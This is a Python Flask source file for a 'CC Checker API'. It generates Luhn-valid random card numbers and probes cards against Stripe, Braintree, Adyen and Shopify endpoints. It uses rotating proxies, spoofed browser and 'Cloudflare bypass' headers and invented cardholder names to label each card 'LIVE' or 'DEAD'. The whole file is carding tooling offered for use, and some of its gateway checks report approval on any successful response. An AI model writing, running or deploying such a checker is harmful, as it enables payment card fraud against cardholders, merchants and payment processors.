from flask import Flask, request, jsonify
import requests
import random
import string
import time
import re
import json
from curl_cffi import requests as curl_requests
import os

app = Flask(__name__)

# En güçlü User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

# Cloudflare bypass headers
CLOUDFLARE_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "DNT": "1",
    "Pragma": "no-cache",
    "Sec-Ch-Ua": '"Google Chrome";v="149", "Chromium";v="149", "Not_A Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": USER_AGENTS[0]
}

class CCGenerator:
    @staticmethod
    def generate_card():
        """Random CC generator with valid BINs"""
        bins = [
            "4" + ''.join(random.choices(string.digits, k=5)),  # Visa
            "5" + ''.join(random.choices(string.digits, k=5)),  # Mastercard
            "3" + ''.join(random.choices(string.digits, k=5)),  # Amex
            "6" + ''.join(random.choices(string.digits, k=5)),  # Discover
        ]
        bin_num = random.choice(bins)
        remaining = 15 - len(bin_num) if bin_num.startswith('3') else 16 - len(bin_num)
        card_number = bin_num + ''.join(random.choices(string.digits, k=remaining))
        
        # Luhn algorithm
        def luhn_checksum(card_number):
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        # Fix checksum
        check_digit = luhn_checksum(card_number[:-1])
        if check_digit != 0:
            check_digit = 10 - check_digit
        card_number = card_number[:-1] + str(check_digit)
        
        return {
            "number": card_number,
            "month": str(random.randint(1, 12)).zfill(2),
            "year": str(random.randint(2026, 2030)),
            "cvv": ''.join(random.choices(string.digits, k=3 if not card_number.startswith('3') else 4))
        }

class CardChecker:
    def __init__(self):
        self.session = requests.Session()
        self.curl_session = curl_requests.Session()
        self.proxies = []
        self.load_proxies()
    
    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        self.proxies.append({
                            'http': f'http://{line}',
                            'https': f'http://{line}'
                        })
        except:
            pass
    
    def get_random_user_agent(self):
        return random.choice(USER_AGENTS)
    
    def get_headers(self):
        headers = CLOUDFLARE_HEADERS.copy()
        headers['User-Agent'] = self.get_random_user_agent()
        return headers
    
    def check_card(self, card_data):
        """Main card checking function"""
        results = {
            "status": "error",
            "message": "",
            "card": card_data,
            "timestamp": time.time()
        }
        
        # Test with different payment gateways
        gateways = [
            self.check_stripe,
            self.check_braintree,
            self.check_adyen,
            self.check_shopify,
        ]
        
        for gateway in gateways:
            try:
                result = gateway(card_data)
                if result and result.get('status') == 'approved':
                    results['status'] = 'approved'
                    results['message'] = 'Card is LIVE'
                    results['gateway'] = result.get('gateway', 'unknown')
                    return results
                elif result and result.get('status') == 'declined':
                    continue
            except Exception as e:
                continue
        
        results['status'] = 'declined'
        results['message'] = 'Card is DEAD'
        return results
    
    def check_stripe(self, card_data):
        """Stripe gateway check"""
        try:
            url = "https://api.stripe.com/v1/tokens"
            
            # Generate random customer data
            first_name = ''.join(random.choices(string.ascii_letters, k=8))
            last_name = ''.join(random.choices(string.ascii_letters, k=8))
            email = f"{first_name.lower()}{random.randint(100,999)}@gmail.com"
            
            data = {
                "card[number]": card_data['number'],
                "card[exp_month]": card_data['month'],
                "card[exp_year]": card_data['year'],
                "card[cvc]": card_data['cvv'],
                "card[name]": f"{first_name} {last_name}",
                "card[address_line1]": "123 Main St",
                "card[address_city]": "New York",
                "card[address_state]": "NY",
                "card[address_zip]": "10001",
                "card[address_country]": "US",
                "payment_user_agent": "stripe.js",
                "referrer": "https://checkout.stripe.com/"
            }
            
            headers = {
                "User-Agent": self.get_random_user_agent(),
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json"
            }
            
            response = requests.post(url, data=data, headers=headers, timeout=15)
            
            if response.status_code == 200:
                try:
                    json_data = response.json()
                    if 'id' in json_data and json_data['id'].startswith('tok_'):
                        return {"status": "approved", "gateway": "stripe"}
                    else:
                        return {"status": "declined", "gateway": "stripe"}
                except:
                    return {"status": "declined", "gateway": "stripe"}
            else:
                return {"status": "declined", "gateway": "stripe"}
                
        except Exception as e:
            return None
    
    def check_braintree(self, card_data):
        """Braintree gateway check"""
        try:
            # Get client token
            url = "https://payments.braintree-api.com/graphql"
            
            query = """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                    }
                }
            }
            """
            
            variables = {
                "input": {
                    "creditCard": {
                        "number": card_data['number'],
                        "expirationMonth": card_data['month'],
                        "expirationYear": card_data['year'],
                        "cvv": card_data['cvv'],
                        "cardholderName": "John Doe",
                        "billingAddress": {
                            "postalCode": "10001",
                            "countryCode": "US"
                        }
                    },
                    "options": {
                        "validate": True
                    }
                }
            }
            
            headers = {
                "User-Agent": self.get_random_user_agent(),
                "Content-Type": "application/json",
                "Braintree-Version": "2018-05-10",
                "Accept": "application/json"
            }
            
            response = requests.post(
                url,
                json={"query": query, "variables": variables},
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'errors' not in data:
                    return {"status": "approved", "gateway": "braintree"}
                else:
                    return {"status": "declined", "gateway": "braintree"}
            else:
                return {"status": "declined", "gateway": "braintree"}
                
        except Exception as e:
            return None
    
    def check_adyen(self, card_data):
        """Adyen gateway check"""
        try:
            url = "https://checkoutshopper-test.adyen.com/checkoutshopper/v1/paymentMethods"
            
            data = {
                "paymentMethod": {
                    "type": "scheme",
                    "number": card_data['number'],
                    "expiryMonth": card_data['month'],
                    "expiryYear": card_data['year'],
                    "securityCode": card_data['cvv'],
                    "holderName": "John Doe"
                },
                "amount": {
                    "currency": "USD",
                    "value": 1000
                },
                "reference": f"TEST-{random.randint(1000,9999)}",
                "countryCode": "US",
                "shopperLocale": "en-US"
            }
            
            headers = {
                "User-Agent": self.get_random_user_agent(),
                "Content-Type": "application/json",
                "Origin": "https://checkoutshopper-test.adyen.com",
                "Accept": "application/json"
            }
            
            response = requests.post(
                f"https://checkoutshopper-test.adyen.com/checkoutshopper/v1/paymentMethods",
                json=data,
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                return {"status": "approved", "gateway": "adyen"}
            else:
                return {"status": "declined", "gateway": "adyen"}
                
        except Exception as e:
            return None
    
    def check_shopify(self, card_data):
        """Shopify gateway check"""
        try:
            url = "https://elb.deposit.shopifycs.com/sessions"
            
            data = {
                "credit_card": {
                    "number": card_data['number'],
                    "month": int(card_data['month']),
                    "year": int(card_data['year']),
                    "verification_value": card_data['cvv'],
                    "name": "John Doe"
                }
            }
            
            headers = {
                "User-Agent": self.get_random_user_agent(),
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": "https://shopify.com"
            }
            
            response = requests.post(
                url,
                json=data,
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                return {"status": "approved", "gateway": "shopify"}
            else:
                return {"status": "declined", "gateway": "shopify"}
                
        except Exception as e:
            return None

checker = CardChecker()

@app.route('/api/generate', methods=['GET'])
def generate_cards():
    """Generate random cards"""
    try:
        count = int(request.args.get('count', 1))
        count = min(count, 100)  # Limit to 100 per request
        
        cards = []
        for _ in range(count):
            card = CCGenerator.generate_card()
            cards.append(card)
        
        return jsonify({
            "status": "success",
            "cards": cards,
            "count": len(cards)
        })
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 400

@app.route('/api/check', methods=['POST'])
def check_cards():
    """Check cards"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        cards = data.get('cards', [])
        if not cards:
            return jsonify({"status": "error", "message": "No cards provided"}), 400
        
        # If single card, wrap in list
        if isinstance(cards, dict):
            cards = [cards]
        
        results = []
        for card in cards:
            # Validate card format
            if 'number' not in card or 'month' not in card or 'year' not in card or 'cvv' not in card:
                results.append({
                    "status": "error",
                    "message": "Invalid card format",
                    "card": card
                })
                continue
            
            # Check card
            result = checker.check_card(card)
            results.append(result)
            
            # Rate limiting
            time.sleep(0.5)
        
        # Count live cards
        live_count = sum(1 for r in results if r.get('status') == 'approved')
        
        return jsonify({
            "status": "success",
            "results": results,
            "live_count": live_count,
            "total": len(results),
            "timestamp": time.time()
        })
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

@app.route('/api/check-single', methods=['POST'])
def check_single_card():
    """Check single card"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        # Validate card format
        required_fields = ['number', 'month', 'year', 'cvv']
        for field in required_fields:
            if field not in data:
                return jsonify({
                    "status": "error",
                    "message": f"Missing field: {field}"
                }), 400
        
        # Check card
        result = checker.check_card(data)
        
        return jsonify({
            "status": "success",
            "result": result,
            "timestamp": time.time()
        })
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get API stats"""
    return jsonify({
        "status": "success",
        "message": "API is running",
        "timestamp": time.time(),
        "endpoints": {
            "/api/generate": "Generate random cards",
            "/api/check": "Check multiple cards (POST)",
            "/api/check-single": "Check single card (POST)",
            "/api/stats": "API statistics"
        }
    })

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        "api": "CC Checker API",
        "version": "1.0.0",
        "endpoints": {
            "/api/generate": "Generate random cards",
            "/api/check": "Check multiple cards (POST)",
            "/api/check-single": "Check single card (POST)",
            "/api/stats": "API statistics"
        },
        "example_usage": {
            "generate": "/api/generate?count=10",
            "check_single": {
                "method": "POST",
                "url": "/api/check-single",
                "body": {
                    "number": "4111111111111111",
                    "month": "12",
                    "year": "2026",
                    "cvv": "123"
                }
            },
            "check_multiple": {
                "method": "POST",
                "url": "/api/check",
                "body": {
                    "cards": [
                        {
                            "number": "4111111111111111",
                            "month": "12",
                            "year": "2026",
                            "cvv": "123"
                        }
                    ]
                }
            }
        }
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
